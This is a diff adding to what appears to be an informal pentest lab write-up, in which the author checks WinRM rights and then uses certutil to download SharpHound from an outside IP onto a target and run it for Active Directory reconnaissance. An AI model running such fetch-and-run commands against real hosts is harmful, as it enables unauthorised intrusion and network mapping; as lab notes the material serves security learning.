@@ -57,3 +57,15 @@ and it works so i try to see if i have winrm rights&#x20;
 <figure><img src="../../../.gitbook/assets/image (156).png" alt=""><figcaption></figcaption></figure>
 
 Will come back later, forgot i had a job my bad gang
+
+I installed sharphound on the target and launch it:
+
+```
+certutil -f -urlcache http://192.168.49.56:9090/SharpHound.exe Sharp.exe
+. ./Sharp.exe
+```
+
+<figure><img src="../../../.gitbook/assets/image (251).png" alt=""><figcaption></figcaption></figure>
+
+Bloodhound can't be installed on the vm bruh
+
